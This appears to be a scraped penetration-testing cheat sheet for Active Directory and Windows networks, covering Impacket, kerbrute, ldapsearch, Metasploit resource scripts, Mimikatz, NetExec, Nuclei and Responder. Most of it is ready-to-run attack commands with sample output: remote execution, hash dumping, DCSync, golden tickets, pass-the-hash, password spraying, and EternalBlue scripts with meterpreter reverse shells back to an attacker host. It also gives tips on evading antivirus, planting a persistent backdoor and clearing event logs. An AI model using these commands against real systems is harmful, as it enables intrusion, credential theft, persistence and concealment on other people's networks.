  • Directory traversal via WebDAV pathing.

  • Web servers that allow execution of uploaded scripts (PHP, ASP, JSP).

  • IIS with WebDAV and .aspx execution enabled.

  • Misconfigured DAV ACLs allowing write from low-privileged accounts.

docs.title: Command-line Shells
docs.text:
Tip

For Windows: PowerShell is more capable but more monitored than cmd.exe. Use cmd.exe for quick recon commands, PowerShell for scripting and .NET access. On Linux, check echo $SHELL — you may be in a restricted shell and not know it.

docs.title: Zshell
docs.text:
export IP=192.168.1.10
export URL=http://192.168.1.10
echo $IP
echo $URL

docs.title: Fish
docs.text:
set -x IP 192.168.1.10
set -x URL http://192.168.1.10
echo $IP
echo $URL

docs.title: Searchsploit
docs.text:
• Download exploit: -m
  • Include URL in results: -u

docs.title: Terminator (Split Terminal Windows)
docs.text:
Split terminal windows for multitasking:

  • Split Horizontally: Ctrl+Shift+O
  • Split Vertically: Ctrl+Shift+E
  • Close Window: exit

docs.title: Impacket
docs.text:
Tip

Most impacket tools follow impacket-<toolname> domain/user:password@target syntax. For pass-the-hash: impacket-wmiexec -hashes :NTLMhash domain/user@target. For Kerberos auth: add -k -no-pass and ensure your /etc/hosts and Kerberos config point to the DC.

docs.title: Core Syntax (Impacket script pattern)
docs.text: <tool>.py [domain/][user][:pass]@<target> [flags]

docs.title: Common patterns:
docs.text:
• DOMAIN/username:password@target — domain account example  

  • username:password@target — local account / no domain  

  • -no-pass — empty password  

  • -hashes LM:NT or :NT — pass-the-hash (supply NT hash)

docs.title: Authentication Methods
docs.text: Method Syntax Example Plaintext psexec.py 'CORP\admin:Passw0rd@10.10.10.10' Hashes (PTH) secretsdump.py 'user@10.10.10.10' -hashes :aad3...:nt... Kerberos GetUserSPNs.py 'CORP/enum:Pass' -request (or use -k with existing ticket) No password / anonymous smbclient.py 'WORKGROUP/guest@10.10.10.10'

docs.title: Enumerate Shares
docs.text:
smbclient.py 'WORKGROUP/guest@10.10.10.10'

Expected Output: 

[*] Querying shares on 10.10.10.10

    ADMIN$

    C$

    Public

docs.title: Download File
docs.text: smbclient.py 'CORP/alice:Passw0rd@10.10.10.10' -command 'get \Users\Public\loot.txt /tmp/loot.txt'

docs.title: Host files (serve payloads)
docs.text:
smbserver.py PWN /home/user/payloads

# Target can copy: copy \10.10.14.2\PWN\payload.exe C:\Temp\payload.exe

docs.title: psexec (service-based, reliable, noisy)
docs.text:
psexec.py 'CORP\Administrator:Passw0rd@10.10.10.10' cmd.exe

Creates a temporary service on the target (Event ID 7045). Use for reliable interactive shells.

docs.title: wmiexec (WMI, stealthier — no service creation)
docs.text: wmiexec.py 'CORP\svc:Password@10.10.10.10'

docs.title: Alternate RPC-based execs
docs.text:
smbexec.py 'user:pass@10.10.10.10'

atexec.py 'user:pass@10.10.10.10'

dcomexec.py 'user:pass@10.10.10.10'

Try different exec methods if one fails — environments vary (DCOM, Task Scheduler, SMB).

docs.title: secretsdump — remote or offline SAM/NTDS extraction
docs.text:
# Remote dump with creds
secretsdump.py 'CORP\Administrator:Passw0rd@10.10.10.10'

# Pass-the-hash mode (NT hash only)
secretsdump.py 'CORP\user@10.10.10.10' -hashes :0123456789abcdef...

Output: NTLM hashes, cached creds, and (when possible) LSA secrets suitable for offline cracking.

docs.title: samrdump / netview — lightweight enumeration
docs.text:
samrdump.py 'CORP\user:Pass@dc.corp.local'

netview.py 'CORP\user:Pass@10.10.10.10'

docs.title: GetNPUsers — AS-REP Roasting (no preauth)
docs.text:
GetNPUsers.py 'CORP\user:Pass' -no-pass
  • Finds accounts with DONT_REQ_PREAUTH and outputs hashes that can be cracked offline (hashcat john format).

docs.title: GetUserSPNs — Kerberoasting (TGS requests)
docs.text:
GetUserSPNs.py 'CORP\user:Pass' -request -outputfile spns.txt
  • Enumerates accounts with SPNs, requests service tickets (TGS), saves crackable blobs for offline brute-forcing.

docs.title: Ticketer / Kerberos ticket ops (advanced)
docs.text: • ticketer.py can craft TGT/TGS tickets in specific scenarios — use only when you understand Kerberos ticket internals.

docs.title: ntlmrelayx — relay captured NTLM auth to target services
docs.text:
# Relay to an SMB host
ntlmrelayx.py -t smb://10.10.10.100 --smb2support

# Relay using targets file & execute module
ntlmrelayx.py -tf targets.txt -smb2support --delegate-access

Typical flow: Run Responder/mitm6 to capture NTLM; run ntlmrelayx to relay to SMB/HTTP/MSSQL and obtain access.

docs.title: mssqlclient — TDS / MSSQL interactive shell
docs.text:
mssqlclient.py 'sa:Pass@10.10.10.10'

# If xp_cmdshell is enabled and you have permissions, you can run OS commands from MSSQL.

docs.title: lookupsid — translate SIDs to accounts & enumerate groups
docs.text: lookupsid.py 'CORP\user:Pass@dc.corp.local' S-1-5-21-...

docs.title: Modules & Scripts You Should Know
docs.text:
# List of high-value Impacket tools for CTFs/pentests:
smbclient.py, smbserver.py, psexec.py, wmiexec.py,

smbexec.py, atexec.py, dcomexec.py, secretsdump.py,

GetNPUsers.py, GetUserSPNs.py, ntlmrelayx.py,

mssqlclient.py, lookupsid.py, samrdump.py, netview.py,

ticketer.py

Common uses:

  • smbclient, smbserver — file ops & payload hosting.  

  • psexec, wmiexec, smbexec — lateral execution.  

  • secretsdump, samrdump — credential harvesting.  

  • GetNPUsers, GetUserSPNs — Kerberos offline cracking.

docs.title: Impacket Cheatsheet
docs.text: Task Command Example Check SMB creds smbclient.py 'CORP\user:Pass@10.10.10.10' List shares smbclient.py 'user:pass@10.10.10.10' Download file smbclient.py 'user:pass@10.10.10.10' -command 'get \\C$\path file' Host payload smbserver.py PWN /home/user/payloads RCE (psexec) psexec.py 'CORP\Administrator:Pass@10.10.10.10' cmd.exe RCE (wmiexec) wmiexec.py 'user:Pass@10.10.10.10' Dump hashes secretsdump.py 'CORP\Administrator:Pass@10.10.10.10' AS-REP roast GetNPUsers.py 'CORP\user:Pass' -no-pass Kerberoast GetUserSPNs.py 'CORP\user:Pass' -request NTLM relay ntlmrelayx.py -t smb://10.10.10.100 --smb2support MSSQL shell mssqlclient.py 'sa:Pass@10.10.10.10'

docs.title: Recommended Operator Workflow
docs.text:
[0] Known creds? Try them against SMB/WinRM.

 ↓

[1] Enumerate shares & services (smbclient, netview).

 ↓

[2] If creds valid → attempt wmiexec (stealth) then psexec (reliable).

 ↓

[3] Dump credentials (secretsdump, samrdump).

 ↓

[4] Domain enum → Kerberos (GetNPUsers/GetUserSPNs) → offline crack.

 ↓

[5] Relay opportunities: run Responder/mitm6 → ntlmrelayx against targets.

 ↓

[6] Horizontal/vertical pivot; collect artifacts.

 ↓

[7] Cleanup & credential rotation.

Pro Tip: After first access, collect for BloodHound and harvest token/delegation material; prioritize persistence only when necessary and within rules of engagement.

docs.title: kerbrute
docs.text:
Binary for kerbrute is in Cracks

Reference: https://github.com/ropnop/kerbrute

docs.title: Kerbrute — Kerberos User Enumeration & AS-REP Roasting
docs.text:
Tip

kerbrute userenum --dc <dc-ip> -d <domain> userlist.txt validates usernames without lockout (Kerberos pre-auth errors don't trigger lockout by default). Start with jsmith, john.smith, jsmith@domain format variations — AD environments vary in UPN format.

docs.title: Key Features
docs.text: Feature Description User Enumeration Finds valid domain users via Kerberos error responses AS-REP Roasting Identifies users without pre-auth (Do not require Kerberos pre-auth) Password Spraying Attempts login with a single password across multiple users Fast & Parallel Written in Go — highly performant and scriptable Safe for Testing Doesn't touch SMB or LDAP — just Kerberos

docs.title: Installation
docs.text:
You need Go installed:

git clone https://github.com/ropnop/kerbrute
cd kerbrute
go build
chmod +x kerbrute_... # if using Linux binary

Or download precompiled binaries from the Releases page.

docs.title: Syntax Summary
docs.text: ./kerbrute [command] [flags]

docs.title: 1. Enumerate Valid Usernames
docs.text:
kerbrute userenum --dc <DC_IP> -d <domain> users.txt

  • Sends AS-REQs without pre-auth to determine if usernames exist

  • Based on KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN vs. KRB5KDC_ERR_PREAUTH_REQUIRED

  • Works even if anonymous LDAP is blocked

Example:

kerbrute userenum -d hokkaido-aerospace.com --dc 10.10.10.10 -d corp.local users.txt

Expected output:

[+] VALID USERNAME: jdoe@corp.local
[-] INVALID USERNAME: hruser@corp.local

Optionally, if you are unaware of any valid usernames, attempt to brute-force them by using the following syntax and wordlist: 

kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.183.40 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt -t 100

docs.title: 2. Find AS-REP Roastable Users
docs.text:
kerbrute asreproast --dc <DC_IP> -d <domain> users.txt

  • Extracts TGTs for accounts with no pre-auth

  • Output is in John/hashcat-compatible $krb5asrep$ format

Example:

kerbrute asreproast --dc 10.10.10.10 -d corp.local users.txt

Output:

[+] FOUND AS-REP Roastable User: svc_backup@corp.local
$krb5asrep$23$svc_backup@CORP.LOCAL:...hash...

You can crack this with:

hashcat -m 18200 hashes.txt rockyou.txt

docs.title: 3. Kerberos Password Spraying
docs.text:
kerbrute passwordspray --dc <DC_IP> -d <domain> users.txt --password <Password123>

Example:

kerbrute passwordspray --dc 10.10.10.10 -d corp.local users.txt --password "Summer2023!"

Output:

[+] VALID LOGIN: jdoe@corp.local:Summer2023!

Good for stealthy single-password attempts across many users

docs.title: Operational Notes
docs.text:
• Works only if UDP/88 or TCP/88 is reachable

  • Does not require domain join or admin rights

  • Avoids logging on SMB/WinRM — makes it quieter than nxc smb sprays

  • Combine with ldapsearch or BloodHound output to build user wordlists

docs.title: Summary: kerbrute Usage
docs.text: Task Command Example User enumeration kerbrute userenum -d corp.local --dc 10.10.10.10 users.txt AS-REP roasting kerbrute asreproast -d corp.local --dc 10.10.10.10 users.txt Password spraying kerbrute passwordspray -d corp.local --dc 10.10.10.10 users.txt --password Pass123 Compile from source go build in the repo folder Crack AS-REP hashes hashcat -m 18200 asrep.txt rockyou.txt

docs.title: Best Practice Workflow
docs.text:
# Step 1: Enumerate users (null SMB/LDAP fails)
kerbrute userenum -d domain.local --dc <DC> users.txt > valid.txt

# Step 2: Identify AS-REP roastable users
kerbrute asreproast -d domain.local --dc <DC> valid.txt > roast.txt

# Step 3: Crack hashes offline
hashcat -m 18200 roast.txt rockyou.txt

# Step 4: Try password spraying if needed
kerbrute passwordspray -d domain.local --dc <DC> valid.txt --password "Welcome1"

docs.title: LDAPSearch — Lightweight Directory Access Protocol Enumeration
docs.text:
Tip

Anonymous bind query: ldapsearch -x -H ldap://<target> -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName. Pipe to grep sAMAccountName for a clean user list. Add -D "user@domain" -w "pass" for authenticated queries.

docs.title: Syntax
docs.text:
ldapsearch -x -H ldap://<ip> -D "<user>@<domain>" -w <password> -b "<baseDN>" <filter> [attributes]

  • -x: Use simple authentication (not SASL)

  • -H: URI of the LDAP server (e.g., ldap://10.10.10.10)

  • -D: Bind DN (user principal name)

  • -w: Password

  • -b: Base DN (Distinguished Name root)

  • <filter>: LDAP filter (e.g., (objectClass=user))

  • [attributes]: Specific fields to return

docs.title: Determine the Base DN (Optional)
docs.text:
Use this if you’re unsure of the BaseDN:

ldapsearch -x -H ldap://10.10.10.10 -s base namingcontexts

Output:

dn:
namingContexts: DC=domain,DC=local

Use this result in the -b flag.

docs.title: 1. Enumerate All Domain Users
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=user)" sAMAccountName

docs.title: 2. Enumerate All Groups
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=group)" sAMAccountName

docs.title: 3. Get Group Membership of Specific User
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(&(objectClass=user)(sAMAccountName=targetuser))" memberOf

docs.title: 4. Enumerate Domain Computers
docs.text: ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=computer)" dNSHostName

docs.title: 5. Get Password Policy (If Exposed)
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "user@domain.local" -w 'password' -b "DC=domain,DC=local" "(objectClass=domain)" maxPwdAge minPwdLength lockoutThreshold

Note: maxPwdAge is in 100-nanosecond intervals. To convert to days:

echo "$(( (-1 * <value>) / 10000000 / 60 / 60 / 24 )) days"

docs.title: Output Parsing Tips
docs.text:
You can save results for later parsing:

ldapsearch ... > ldap_output.txt

Then extract users quickly:

grep sAMAccountName ldap_output.txt | cut -d' ' -f2

docs.title: Example: Full Command in Practice
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "svc_reader@corp.local" -w 'Summer2023!' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName memberOf

This dumps all usernames and group memberships the account can see.

docs.title: Summary: ldapsearch Usage
docs.text: Task Command (example) Find Base DN ldapsearch -x -H ldap://<ip> -s base namingcontexts List domain users ldapsearch ... "(objectClass=user)" sAMAccountName List domain groups ldapsearch ... "(objectClass=group)" sAMAccountName Group membership of user ldapsearch ... "(sAMAccountName=username)" memberOf List domain computers ldapsearch ... "(objectClass=computer)" dNSHostName Dump password policy ldapsearch ... "(objectClass=domain)" maxPwdAge ...

docs.title: Notes
docs.text:
• You must have bind credentials (username/password) unless anonymous LDAP binds are allowed (rare in modern AD)

  • ldapsearch is very OPSEC-safe compared to executing RPC or SMB scans

  • Use -LLL for cleaner output formatting

  • Combine with cut, grep, awk for automation/scripting

docs.title: Quick Username Extraction Script
docs.text:
ldapsearch -x -H ldap://10.10.10.10 -D "svc@corp.local" -w 'pass' -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName \
    | grep "^sAMAccountName" | cut -d' ' -f2 > usernames.txt

docs.title: Metasploit Resource Scripts
docs.text:
Tip

Resource scripts automate repetitive Metasploit workflows. Save a sequence of set and run commands to a .rc file, then: msfconsole -r script.rc. Useful for setting up multi/handler listeners that survive session disconnects.

docs.title: Creating and Using Resource Scripts
docs.text: A resource script is a plain text file containing a sequence of Metasploit commands.

docs.title: Basic Structure of a Resource Script
docs.text:
Create a script (automation.rc) with the following content:

use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
exploit

Run the script in Metasploit:

msfconsole -r automation.rc

docs.title: Automating Exploitation with Resource Scripts
docs.text: Resource scripts can be used to automate common exploitation steps.

docs.title: Example: Automating an SMB Exploit
docs.text:
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
run

Save it as smb_exploit.rc and execute:

msfconsole -r smb_exploit.rc

docs.title: Post-Exploitation Automation
docs.text: Resource scripts can be used for privilege escalation, persistence, and data collection.

docs.title: Example: Gathering System Information
docs.text:
use post/windows/gather/enum_system
set SESSION 1
run

docs.title: Example: Extracting Password Hashes
docs.text:
use post/windows/gather/hashdump
set SESSION 1
run

docs.title: Creating a Persistent Backdoor
docs.text:
use exploit/windows/local/persistence
set SESSION 1
set LHOST 192.168.1.200
set LPORT 4444
run

docs.title: Downloading a File from Target
docs.text:
use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /root/
run

docs.title: Uploading a File to Target
docs.text:
use post/windows/manage/upload
set SESSION 1
set SRC /root/payload.exe
set DST C:\\Users\\Public\\payload.exe
run

docs.title: Combining Resource Scripts for Full Automation
docs.text:
Multiple tasks can be combined into a single .rc file:

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.105
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.200
set LPORT 4444
exploit -z

use post/windows/gather/hashdump
set SESSION 1
run

use post/windows/manage/download
set SESSION 1
set REMOTE_FILE C:\\Users\\Admin\\Documents\\secrets.txt
set LOCAL_DIRECTORY /root/
run

docs.title: Executing Multiple Resource Scripts in a Loop
docs.text:
for script in $(ls /root/scripts/*.rc); do
    msfconsole -r $script
done

Metasploit resource scripts streamline repetitive tasks, making them valuable for efficient penetration testing and post-exploitation automation.

docs.title: Mimikatz Cheat Sheet (OSCP+ Focused)
docs.text:
Tip

Always run privilege::debug first before any dump commands — without it, most commands fail silently. If you get ERROR kuhl_m_privilege_simple ; RtlAdjustPrivilege (20) c0000061, you're not running as admin or token impersonation failed.

Watch out

Mimikatz is heavily detected. Use obfuscated versions (Invoke-Mimikatz from PowerSploit, or mimikatz_trunk with custom compilation) on systems with AV. The PyPy port pypykatz runs without dropping a binary.

docs.title: Setup
docs.text:
Run from an elevated prompt on a domain-joined Windows machine (cmd or PowerShell):

privilege::debug
token::elevate

As stated above, this requires administrator privileges.

Mimikatz cannot be used (as far as I'm aware) on evil-winrm

docs.title: Basic Dump
docs.text:
sekurlsa::logonpasswords

Lists credentials currently in memory — including:

  • NTLM hashes

  • Clear-text passwords (if cached)

  • Kerberos TGT info

When you come across a valid username & NTLM hash, first, attempt to crack it with hashcat. If you are unable to crack, use evil-winrm to perform a PtH attack and move laterally/vertically on the network to another host.

docs.title: 2. Dump Cached Kerberos Tickets
docs.text:
kerberos::list

Extract .kirbi ticket files:

kerberos::list /export

docs.title: 3. Inject a Ticket (Pass-the-Ticket / PTT)
docs.text:
Load .kirbi ticket into memory:

kerberos::ptt ticket.kirbi

Confirm with:

klist

Use .kirbi files harvested from Rubeus or Mimikatz itself.

docs.title: Prerequisites
docs.text:
• NTLM hash of service account

  • Domain name, SID

  • Service SPN (e.g., HTTP/web01.htb.local)

kerberos::golden /user:<username> /domain:<domain> /sid:<domain-SID> /rc4:<NTLM-hash> /service:<service> /target:<FQDN> /ptt

Example:

kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.htb.local /ptt

docs.title: Prerequisites
docs.text:
• NTLM hash of krbtgt

  • Domain SID

  • Domain name

kerberos::golden /user:<admin-user> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt-hash> /ptt

Example:

kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt

docs.title: 6. DCSync Attack (Dump Hashes Without Touching LSASS)
Dump Administrator Hash
docs.text: lsadump::dcsync /domain:htb.local /user:administrator

docs.title: Dump krbtgt Hash (for Golden Ticket)
docs.text:
lsadump::dcsync /domain:htb.local /user:krbtgt

Requires Replicating Directory Changes privilege

docs.title: 7. LSA Secrets (Service Account & System Info Dump)
docs.text:
lsadump::secrets

Useful to extract:

  • Service account credentials

  • Saved RDP credentials

  • Cached scheduled task passwords

docs.title: 8. Extract Domain Cached Credentials (DCC)
docs.text:
lsadump::cache

These are useful for offline cracking using hashcat mode 2100.

docs.title: 9. Pass-the-Hash (PTH) via Token Replacement
docs.text:
Create a token and run a command with impersonated credentials:

sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe

Example:

sekurlsa::pth /user:svc_sql /domain:htb.local /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe

docs.title: 10. Token Impersonation
docs.text:
List tokens:

token::list

Impersonate SYSTEM token:

token::elevate

Impersonate another user token (from token list):

token::impersonate <token_id>

docs.title: 11. Dump All Data in One Shot (Interactive)
docs.text:
log
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /user:krbtgt
kerberos::list /export

docs.title: 12. Export Tickets for Offline Analysis
docs.text:
kerberos::list /export

Move .kirbi files for re-use via kerberos::ptt or Rubeus tgtdeleg

docs.title: Full Golden Ticket Attack Chain
docs.text:
# From SYSTEM shell on domain-joined box:
privilege::debug
lsadump::dcsync /domain:htb.local /user:krbtgt
kerberos::golden /user:admin /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
klist
PsExec.exe \\dc01 cmd.exe

docs.title: Summary: Common Use Cases
docs.text: Objective Command Dump LSASS creds sekurlsa::logonpasswords Extract krbtgt hash lsadump::dcsync /user:krbtgt Create Golden Ticket kerberos::golden /krbtgt:<hash> /ptt Create Silver Ticket kerberos::golden /rc4:<hash> /service:<svc> PTT any .kirbi ticket kerberos::ptt <ticket.kirbi> List current tickets kerberos::list Dump LSA secrets lsadump::secrets Impersonate token token::impersonate <id>

docs.title: References
docs.text:
• Mimikatz GitHub (gentilkiwi)

  • ADSecurity: Golden Ticket

  • Mimikatz Module Reference

  • SpecterOps Kerberos Series

docs.title: NetExec (Fork of CrackMapExec)
docs.text:
NetExec replaces CrackMapExec

NetExec (nxc) is the actively maintained fork of CrackMapExec (cme). Commands are near-identical — just replace cme with nxc. Use nxc on new installs; cme still works but is no longer maintained.

docs.title: Installing NetExec
docs.text:
git clone https://github.com/Pennyw0rth/NetExec
cd NetExec
pip3 install -r requirements.txt
python3 setup.py install

Optional: Set up a Python virtualenv to isolate dependencies.

docs.title: Core Syntax
docs.text: nxc <protocol> <target(s)> [flags]

docs.title: Protocols:
docs.text:
• smb – Server Message Block (Windows file shares)
  • winrm – Remote Windows PowerShell
  • ldap – AD user/group enumeration
  • kerberos – For TGT/TGS ticket hunting (w/ --kerberos)
  • mssql, rdp, ssh, ftp, http, imap – Available via modules

docs.title: Authentication Methods
docs.text: Method Syntax Example Plaintext -u user -p pass Hashes (PTH) -u user -H aad3...:hash Kerberos -k -d domain.local (Requires KRB5CCNAME or ticket) AAD/SSPI (not yet supported) Work in progress (use other tools)

docs.title: Validate Credentials
docs.text: nxc smb 10.10.10.10 -u alice -p Winter2020!

docs.title: Enumerate Shares
docs.text:
nxc smb 10.10.10.10 -u alice -p Winter2020! --shares

Expected Output:

[+] 10.10.10.10:445 - Found 3 accessible shares:
    - ADMIN$
    - C$
    - Public

docs.title: Download File
docs.text: nxc smb 10.10.10.10 -u user -p pass --exec "get \\10.10.10.10\C$\Users\Public\loot.txt loot.txt"

docs.title: Upload File
docs.text: nxc smb 10.10.10.10 -u user -p pass --exec "put local.exe \\10.10.10.10\C$\Temp\local.exe"

docs.title: Over SMB
docs.text:
nxc smb 10.10.10.10 -u admin -p 'Passw0rd!' -d DOMAIN --exec 'cmd.exe /c whoami'

Requires admin access (impersonates via svcctl, wmi, etc. internally)

docs.title: Over WinRM (PowerShell)
docs.text: nxc winrm 10.10.10.10 -u admin -p 'Passw0rd!' -d domain --exec 'whoami'

docs.title: Pass-the-Hash (PTH)
docs.text:
nxc smb 10.10.10.10 -u admin -H aad3b435b51404eeaad3b435b51404ee:ccb749a1e26e51b6e07ed92d6d68f762 -d domain --exec 'hostname'

Why it works: Uses NTLMv1/v2 authentication to bypass password requirement.

docs.title: Kerberos Authentication (TGT-based)
docs.text:
1. Request TGT with impacket-getTGT
impacket-getTGT domain/user:password
  1. Export ccache:
export KRB5CCNAME=/path/to/krb5cc_domain
  1. Run NetExec with --kerberos
nxc smb 10.10.10.10 -k -d domain.local --exec 'whoami'

Use this for OPSEC-safe access when you already have a valid ticket.

docs.title: AD Enumeration via LDAP
docs.text:
nxc ldap 10.10.10.10 -u user -p pass -d domain.local --users

nxc ldap 10.10.10.10 -u user -p pass -d domain.local --groups

Other LDAP options:

  • --computers

  • --password-policy

  • --domain-controllers

  • --loggedon-users

docs.title: Modules You Should Know
docs.text:
nxc smb <target> -u user -p pass -d domain --modules

Common useful modules:

  • lsassy: Extracts LSASS credentials via SeDebugPrivilege

  • wmi: Executes WMI queries

  • psremote: Executes PowerShell scripts remotely

  • samdump: Dumps local SAM hashes

  • dpapi: Attempts DPAPI blob extraction

  • credz: Parses saved credentials

docs.title: Cleanup (Post-Exploitation Hygiene)
docs.text:
Remove artifacts like payloads or logs:

nxc smb 10.0.0.12 -u user -p pass --exec "del C:\Temp\rev.exe"

Clear Windows Event Logs if needed (⚠️ noisy, only do if absolutely necessary):

nxc winrm 10.0.0.12 -u user -p pass -d domain --exec 'wevtutil cl Security'

Logoff/Disable the backdoor account if you created one:

nxc smb 10.0.0.12 -u admin -p pass --exec 'net user backdoor /delete'

docs.title: NetExec Cheatsheet
docs.text: Task Command Example Check credentials (SMB) nxc smb $IP -u user -p pass Enumerate shares nxc smb $IP -u user -p pass --shares List domain users/groups nxc ldap $IP -u user -p pass --users / --groups PTH authentication nxc smb $IP -u user -H LM:NT Kerberos authentication nxc smb -k -d domain.local Execute command (SMB) nxc smb $IP -u admin -p pass --exec 'whoami' WinRM command execution nxc winrm $IP -u admin -p pass --exec 'hostname' Upload file nxc smb $IP --exec 'put local.exe \\C$\Temp\back.exe' Download file nxc smb $IP --exec 'get \\C$\Temp\loot.txt local.txt' Pivot with ProxyChains proxychains nxc smb $IP ... Enumerate AD password policy nxc ldap $IP -u user -p pass --password-policy

docs.title: Recommended Operator Workflow
docs.text:
[0] Known creds? Try them!
 ↓
[1] Validate credentials (SMB or WinRM)
 ↓
[2] Enumerate shares → find loot
 ↓
[3] Enumerate users, groups, computers via LDAP
 ↓
[4] Identify Admin rights → execute payload or commands
 ↓
[5] Pivot internally via ProxyChains or socks
 ↓
[6] Dump creds (lsassy, samdump, dpapi)
 ↓
[7] Cleanup (remove binaries/logs)

Pro Tip: After first access, start a BloodHound collection or dump tokens for delegation/impersonation.

docs.title: Nuclei
docs.text:
Tip

For web API enumeration: nuclei -u <target> -t exposed-panels/ -t exposures/ -t misconfiguration/ covers the most impactful templates. Use -severity critical,high to filter noise. Nuclei is much faster than manual checks for known CVEs on large scope.

docs.title: Installing Nuclei
docs.text:
If not already installed, Nuclei can be installed via:

curl -s https://api.github.com/repos/projectdiscovery/nuclei/releases/latest | grep "browser_download_url.*nuclei-linux-amd64" | cut -d : -f 2,3 | tr -d \" | wget -qi -
chmod +x nuclei-linux-amd64
mv nuclei-linux-amd64 /usr/local/bin/nuclei

Verify installation:

nuclei -version

docs.title: Updating Nuclei Templates
docs.text:
Nuclei uses templates for scanning various vulnerabilities, API endpoints, and web assets. Update them before running a scan:

nuclei -update

To view available templates:

ls ~/.nuclei-templates/

docs.title: Basic Web Enumeration
docs.text:
Scanning a single URL:

nuclei -u https://target.com

Scanning multiple URLs:

cat urls.txt | nuclei -l -

docs.title: API Enumeration with Nuclei
docs.text: Nuclei has built-in templates for detecting API misconfigurations and sensitive endpoints.

docs.title: Identifying API Endpoints
docs.text: nuclei -u https://target.com -t http/api/api-endpoints.yaml

docs.title: Scanning for API Keys and Sensitive Data
docs.text: nuclei -u https://target.com -t http/exposures/api-tokens.yaml

docs.title: Checking for Open API (Swagger) Exposure
docs.text: nuclei -u https://target.com -t http/api/openapi.yaml

docs.title: Detecting GraphQL Misconfigurations
docs.text: nuclei -u https://target.com -t http/api/graphql.yaml

docs.title: Running a Full Web Security Scan
docs.text:
nuclei -u https://target.com -t http/

This will run all HTTP-based templates against the target.

docs.title: Scanning for CVEs in Web Applications
docs.text: nuclei -u https://target.com -t cves/

docs.title: Finding Subdomains and Associated Services
docs.text: nuclei -u https://target.com -t dns/

docs.title: Excluding False Positives
docs.text: nuclei -u https://target.com -t http/ -exclude-severity info

docs.title: Saving Output to a File
docs.text: nuclei -u https://target.com -t http/ -o results.txt

docs.title: Running Nuclei with Proxy for Stealth
docs.text: nuclei -u https://target.com -proxy http://127.0.0.1:8080

docs.title: Running Nuclei on Subdomain Enumeration Results
docs.text: subfinder -d target.com -silent | nuclei -t http/

docs.title: Using Nuclei with FFuF for Parameter Fuzzing
docs.text: ffuf -w wordlist.txt -u https://target.com/FUZZ | nuclei -t http/

docs.title: Responder – LLMNR/NBT-NS/MDNS Poisoning & Credential Capture
docs.text:
Tip

Run sudo responder -I tun0 -wrf as soon as you have internal network access — it passively captures NTLMv2 hashes from any misconfigured name resolution. Crack with hashcat -m 5600. If SMB signing is disabled on targets, relay with ntlmrelayx instead of cracking.

docs.title: LLMNR (Link-Local Multicast Name Resolution)
docs.text:
• Protocol: UDP/5355

  • Purpose: Resolves local network hostnames when DNS fails.

  • Exploitable: Yes. Windows systems fall back to LLMNR if DNS fails.

docs.title: NBT-NS (NetBIOS Name Service)
docs.text:
• Protocol: UDP/137

  • Legacy protocol for name resolution (Windows pre-Win10).

  • Highly vulnerable to spoofing.

docs.title: mDNS (Multicast DNS)
docs.text:
• Protocol: UDP/5353

  • Used in macOS and IoT environments.

  • Also spoofable via Responder.

When a system tries to access \\UNRESOLVEDHOST, it sends a broadcast like:

Who has UNRESOLVEDHOST?

Responder replies, "I do," causing the system to attempt SMB/HTTP auth to the attacker's IP.

docs.title: Basic Usage
docs.text:
sudo responder -I tun0

  • -I tun0: Interface to bind to

  • -v: Verbose mode

docs.title: Recommended Usage
docs.text:
sudo responder -I tun0 -wrf

  • -w: Answer WPAD (Web Proxy Auto-Discovery) requests

  • -r: Respond to NetBIOS Name Service (NBT-NS) requests

  • -f: Respond to File/SMB requests

docs.title: Logs and Hashes
docs.text:
Responder writes captured hashes to:

Responder/logs/<TARGET-IP>-SMB-NTLMv2-<timestamp>.txt

docs.title: NTLMv1/NTLMv2 Format Example:
docs.text:
USERNAME::DOMAIN:LMHASH:NTHASH:CHALLENGE:RESPONSE

Captured hashes can be:

  • Cracked offline

  • Relayed via ntlmrelayx

  • Injected with tools like pth-winexe, pth-smbclient, etc.

docs.title: With Hashcat (NTLMv2 – Mode 5600)
docs.text: hashcat -m 5600 responder_hash.txt /usr/share/wordlists/rockyou.txt

docs.title: With John the Ripper
docs.text: john --format=netntlmv2 responder_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

docs.title: Extract Only the Hash
docs.text: cut -d ' ' -f 3 responder.log > responder_hashes.txt

docs.title: NTLM Relay Attacks (ntlmrelayx)
docs.text: Responder can be paired with Impacket's ntlmrelayx to authenticate to other services instead of cracking hashes.

